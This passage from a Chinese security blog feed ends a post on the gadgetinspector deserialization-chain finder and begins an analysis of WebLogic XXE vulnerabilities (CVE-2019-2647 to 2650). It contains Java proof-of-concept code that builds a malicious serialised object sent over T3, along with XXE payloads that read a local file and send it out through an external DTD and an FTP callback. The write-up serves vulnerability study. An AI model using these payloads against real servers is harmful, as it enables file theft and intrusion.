class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">interface</span> <span class="title">ExecCmd</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            ExecCmd execCmd = cmd -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> execCmd.exec((String) arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过测试，没有检测到这条利用链。说明目前语法分析那一块还没有对特殊语法分析。</p><h5 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h5><p>测试匿名内部类，将FnEval.java做一些修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">FnEval.java:</span><br><span class="line">    <span class="keyword">package</span> com.demo.ifn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    <span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FnEval</span> <span class="keyword">implements</span> <span class="title">IFn</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FnEval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">interface</span> <span class="title">ExecCmd</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">callExec</span><span class="params">(ExecCmd execCmd, String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> execCmd.exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> callExec(<span class="keyword">new</span> ExecCmd() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (String) arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过测试，没有检测到这条利用链。说明目前语法分析那一块还没有对匿名内部类的分析。</p><h3 id="sink-gt-source"><a href="#sink-gt-source" class="headerlink" title="sink-&gt;source?"></a>sink-&gt;source?</h3><p>既然能source-&gt;sink，那么能不能sink-&gt;source呢？因为搜索source-&gt;sink时，source和sink都是已知的，如果搜索sink-&gt;source时，sink与soure也是已知的，那么source-&gt;sink与sink-&gt;source好像没有什么区别？如果能将source总结为参数可控的一类特征，那么sink-&gt;source这种方式是一种非常好的方式，不仅能用在反序列化漏洞中，还能用在其他漏洞中（例如模板注入）。但是这里也还有一些问题，比如反序列化是将this以及类的属性都当作了0参，因为反序列化时这些都是可控的，但是在其他漏洞中这些就不一定可控了。</p><p>目前还不知道具体如何实现以及会有哪些问题，暂时先不写。</p><h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>目前还没有做过大量测试，只是从宏观层面分析了这个工具的大致原理。结合平安集团<a href="https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg" target="_blank" rel="noopener">分析文章</a>以及上面的测试目前可以总结出一下几个缺点（不止这些缺陷）：</p><ul><li>callgraph生成不完整</li><li>调用链搜索结果不完整，这是由于查找策略导致的</li><li>一些特殊语法、匿名内部类还不支持</li><li>…</li></ul><h3 id="设想与改进"><a href="#设想与改进" class="headerlink" title="设想与改进"></a>设想与改进</h3><ul><li><p>对以上几个缺陷进行改进</p></li><li><p>结合已知的利用链(如ysoserial等)不断测试</p></li><li><p>尽可能列出所有链并结合人工筛选判断，而作者使用的策略是只要经过这个节点有一条链，其他链经过这个节点时就不再继续寻找下去。主要解决的就是最后那个调用链环路问题，目前看到几种方式：</p><ul><li>DFS+最大深度限制</li><li>继续使用BFS，人工检查生成的调用链，把无效的callgraph去掉，重复运行</li><li>调用链缓存（这一个暂时还没明白具体怎么解决环路的，只是看到了这个方法）</li></ul><p>我的想法是在每条链中维持一个黑名单，每次都检查是否出现了环路，如果在这条链中出现了环路，将造成环路的节点加入黑名单，继续使其走下去。当然虽然没有了环，也能会出现路径无限增长的情况，所以还是需要加入路径长度限制。</p></li><li><p>尝试sink-&gt;source的实现</p></li><li><p>多线程同时搜索多条利用链加快速度</p></li><li><p>…</p></li></ul><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>在原理分析的时候，忽略了字节码分析的细节，有的地方只是暂时猜测与测试得出的结果，所以可能存在一些错误。字节码分析那一块是很重要的一环，它对污点的判断、污点的传递调用等起着很重要的作用，如果这些部分出现了问题，整个搜索过程就会出现问题。由于ASM框架对使用人员要求较高，所以需要要掌握JVM相关的知识才能较好使用ASM框架，所以接下来的就是开始学习JVM相关的东西。这篇文章只是从宏观层面分析这个工具的原理，也算是给自己增加些信心，至少明白这个工具不是无法理解和无法改进的，同时后面再接触这个工具进行改进时也会间隔一段时间，回顾起来也方便，其他人如果对这个工具感兴趣也可以参考。等以后熟悉并能操纵Java字节码了，在回头来更新这篇文章并改正可能有错误的地方。</p><p>如果这些设想与改进真的实现并且进行了验证，那么这个工具真的是一个得力帮手。但是这些东西要实现还有较长的一段路要走，还没开始实现就预想到了那么多问题，在实现的时候会遇到更多问题。不过好在有一个大致的方向了，接下来就是对各个环节逐一解决了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></li><li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></li><li><a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wPbW6zQ52w8</a></li><li><a href="https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RD90-78I7wRogdYdsB-UOg</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;当你觉得很累的时候，说明你正在走上坡路。&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;记录下自己初步研究gadgetinspector这个工具的一些东西吧&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析</title>
    <link href="http://longofo.cc/WebLogic%20CVE-2019-2647%E3%80%81CVE-2019-2648%E3%80%81CVE-2019-2649%E3%80%81CVE-2019-2650%20XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
    <id>http://longofo.cc/WebLogic CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650 XXE漏洞分析.html</id>
    <published>2019-05-13T06:37:56.000Z</published>
    <updated>2020-07-30T02:28:37.781Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><blockquote><p>@xxlegend在他的<a href="http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a>分析了其中的一个XXE漏洞点，并给出了PoC，作为入门级的Java新手，在大佬分析的基础上再分析很适合学习Java漏洞</p></blockquote><p>Oracle发布了4月份的补丁，详情见链接(<a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html#AppendixFMW</a></p><a id="more"></a><p>@xxlegend在他的<a href="http://xxlegend.com/2019/04/19/weblogic%20CVE-2019-2647%E7%AD%89%E7%9B%B8%E5%85%B3XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">博客</a>分析了其中的一个XXE漏洞点，并给出了PoC。刚入手java不久，本着学习的目的，自己尝试分析了其他几个点的XXE并构造了PoC。下面的分析我尽量描述自己思考以及PoC构造过程，新手真的会踩很多莫名其妙的坑。感谢在复现与分析过程中为我提供帮助的小伙伴@Badcode，没有他的帮助我可能环境搭起来都会花费一大半时间。</p><h3 id="补丁分析，找到漏洞点"><a href="#补丁分析，找到漏洞点" class="headerlink" title="补丁分析，找到漏洞点"></a>补丁分析，找到漏洞点</h3><p>根据JAVA常见XXE写法与防御方式(参考<a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/23/java-xxe/</a>)，通过对比补丁，发现新补丁以下四处进行了<code>setFeature</code>操作:</p><p><img src="../images/weblogic-xxe/1.png" alt=""></p><p>应该就是对应的四个CVE了，其中<code>ForeignRecoveryContext</code>@xxlegend大佬已经分析过了，这里就不再分析了，下面主要是分析下其他三个点</p><h3 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h3><ul><li>Windows 10</li><li>WebLogic 10.3.6.0</li><li>Jdk160_29（WebLogic 10.3.6.0自带的JDK）</li></ul><h3 id="WsrmServerPayloadContext-漏洞点分析"><a href="#WsrmServerPayloadContext-漏洞点分析" class="headerlink" title="WsrmServerPayloadContext 漏洞点分析"></a>WsrmServerPayloadContext 漏洞点分析</h3><p><code>WsrmServerPayloadContext</code>修复后的代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.wsee.reliability;</span><br><span class="line"><span class="keyword">import</span> ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WsrmServerPayloadContext</span> <span class="keyword">extends</span> <span class="title">WsrmPayloadContext</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> EndpointReference <span class="title">readEndpt</span><span class="params">(ObjectInput var1, <span class="keyword">int</span> var2)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            ByteArrayInputStream var15 = <span class="keyword">new</span> ByteArrayInputStream(var3);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                DocumentBuilderFactory var7 = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String var8 = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;</span><br><span class="line">                    var7.setFeature(var8, <span class="keyword">false</span>);</span><br><span class="line">                    var8 = <span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>;</span><br><span class="line">                    var7.setFeature(var8, <span class="keyword">false</span>);</span><br><span class="line">                    var8 = <span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>;</span><br><span class="line">                    var7.setFeature(var8, <span class="keyword">false</span>);</span><br><span class="line">                    var7.setXIncludeAware(<span class="keyword">false</span>);</span><br><span class="line">                    var7.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                        Verbose.log(<span class="string">"Failed to set factory:"</span> + var11);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到进行了<code>setFeature</code>操作防止xxe攻击，而未打补丁之前是没有进行<code>setFeature</code>操作的</p><p><code>readExternal</code>在反序列化对象时会被调用，与之对应的<code>writeExternal</code>在序列化对象时会被调用，看下<code>writeExternal</code>的逻辑:</p><p><img src="../images/weblogic-xxe/2.png" alt=""></p><p><code>var1</code>就是<code>this.formENdpt</code>，注意<code>var5.serialize</code>可以传入三种类型的对象，<code>var1.getEndptElement()</code>返回的是<code>Element</code>对象，先尝试新建一个项目构造一下<code>PoC</code>:</p><p>结构如下</p><p><img src="../images/weblogic-xxe/4.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyEndpointReference</span> <span class="keyword">extends</span> <span class="title">EndpointReference</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Element <span class="title">getEndptElement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.getEndptElement();</span><br><span class="line">            Document doc = <span class="keyword">null</span>;</span><br><span class="line">            Element element = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">                <span class="comment">//从DOM工厂中获得DOM解析器</span></span><br><span class="line">                DocumentBuilder dbBuilder = dbFactory.newDocumentBuilder();</span><br><span class="line">                <span class="comment">//创建文档树模型对象</span></span><br><span class="line">                doc = dbBuilder.parse(<span class="string">"test.xml"</span>);</span><br><span class="line">                element = doc.getDocumentElement();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> element;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        EndpointReference fromEndpt = (EndpointReference) <span class="keyword">new</span> MyEndpointReference();</span><br><span class="line"></span><br><span class="line">        EndpointReference faultToEndpt = <span class="keyword">null</span>;</span><br><span class="line">        WsrmServerPayloadContext wspc = <span class="keyword">new</span> WsrmServerPayloadContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Field f1 = wspc.getClass().getDeclaredField(<span class="string">"fromEndpt"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(wspc, fromEndpt);</span><br><span class="line"></span><br><span class="line">            Field f2 = wspc.getClass().getDeclaredField(<span class="string">"faultToEndpt"</span>);</span><br><span class="line">            f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f2.set(wspc, faultToEndpt);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wspc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.xml内容如下，my.dtd暂时为空就行，先测试能否接收到请求:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:8000/my.dtd" [</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT data (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行PoC，生成的反序列化数据xxe，使用十六进制查看器打开:</p><p><img src="../images/weblogic-xxe/3.png" alt=""></p><p>发现DOCTYPE无法被引入</p><p>我尝试了下面几种方法：</p><ul><li><p>在上面说到<code>var5.serialize</code>可以传入<code>Document</code>对象，测试了下，的确可以，但是如何使<code>getEndptElement</code>返回一个<code>Document</code>对象呢？</p><ul><li>尝试了自己创建一个<code>EndpointReference</code>类，修改<code>getEndptElement</code>返回对象，内容和原始内容一样，但是在反序列化时找不到我创建的类，原因是自己建的类<code>package</code>与原来的不同，所以失败了</li><li>尝试像Python那样动态替换一个类的方法，貌似Java好像做不到…</li></ul></li><li><p>尝试了一个暴力的方法，替换Jar包中的类。首先复制出Weblogic的<code>modules</code>文件夹与<code>wlserver_10.3\server\lib</code>文件夹到另一个目录，将<code>wlserver_10.3\server\lib\weblogic.jar</code>解压，将<code>WsrmServerPayloadContext.class</code>类删除，重新压缩为<code>weblogic.Jar</code>，然后新建一个项目，引入需要的Jar文件（<code>modules</code>和<code>wlserver_10.3\server\lib</code>中所有的Jar包），然后新建一个与<code>WsrmServerPayloadContext.class</code>同样的包名，在其中新建<code>WsrmServerPayloadContext.class</code>类，复制原来的内容进行修改(修改只是为了生成能触发xml解析的数据，对<code>readExternal</code>反序列化没有影响)。</p><p><code>WsrmServerPayloadContext.class</code>修改的内容如下:</p><p><img src="../images/weblogic-xxe/6.png" alt=""></p></li><li><p>经过测试第二种方式是可行的，但是好像过程略复杂。然后尝试了下新建一个与原始<code>WsrmServerPayloadContext.class</code>类同样的包名，然后进行修改，修改内容与第二种方式一样</p><p><img src="../images/weblogic-xxe/12.png" alt=""></p><p>测试这种方式也是可行的，比第二种方式操作起来方便些</p></li></ul><p>构造新的PoC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">images</span>/<span class="title">weblogic</span>-<span class="title">xxe1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Object instance = getXXEObject();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"xxe"</span>));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getXXEObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        EndpointReference fromEndpt = <span class="keyword">new</span> EndpointReference();</span><br><span class="line"></span><br><span class="line">        EndpointReference faultToEndpt = <span class="keyword">null</span>;</span><br><span class="line">        WsrmServerPayloadContext wspc = <span class="keyword">new</span> WsrmServerPayloadContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Field f1 = wspc.getClass().getDeclaredField(<span class="string">"fromEndpt"</span>);</span><br><span class="line">            f1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f1.set(wspc, fromEndpt);</span><br><span class="line"></span><br><span class="line">            Field f2 = wspc.getClass().getDeclaredField(<span class="string">"faultToEndpt"</span>);</span><br><span class="line">            f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            f2.set(wspc, faultToEndpt);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> wspc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看下新生成的xxe十六进制:</p><p><img src="../images/weblogic-xxe/7.png" alt=""></p><p>DOCTYPE被写入了</p><p>测试下，使用T3协议脚本向WebLogic 7001端口发送序列化数据:</p><p><img src="../images/weblogic-xxe/11.png" alt=""></p><p><img src="../images/weblogic-xxe/10.png" alt=""></p><p>漂亮，接收到请求了，接下来就是尝试下到底能不能读取到文件了</p><p>构造的test.xml如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY % file SYSTEM "file:///C:Users/dell/Desktop/test.txt"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/my.dtd"&gt;</span></span><br><span class="line"><span class="meta">        %dtd;</span></span><br><span class="line"><span class="meta">        %send;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ANY</span>&gt;</span>xxe<span class="tag">&lt;/<span class="name">ANY</span>&gt;</span></span><br></pre></td></tr></table></figure><p>my.dtd如下(my.dtd在使用PoC生成反序列化数据的时候先清空，然后，不然在<code>dbBuilder.parse</code>时会报错无法生成正常的反序列化数据，至于为什么，只有自己测试下才会明白):</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">all</span></span></span><br><span class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'ftp://127.0.0.1:2121/%file;'&gt;"</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>运行PoC生成反序列化数据，测下发现请求都接收不到了…，好吧，查看下十六进制:</p><p><img src="../images/weblogic-xxe/13.png" alt=""></p><p><code>%dtd;%send;</code>居然不见了…，可能是因为DOM解析器的原因，my.dtd内容为空，数据没有被引用。</p><p>尝试debug看下:</p><p><img src="../images/weblogic-xxe/22.png" alt=""></p><p>可以看到<code>%dtd;%send;</code>确实是被处理掉了</p><p>测试下正常的加载外部数据，my.dtd改为如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">all</span></span></span><br><span class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1:8000/gen.xml'&gt;"</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>gen.xml为:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>debug看下:</p><p><img src="../images/weblogic-xxe/23.png" 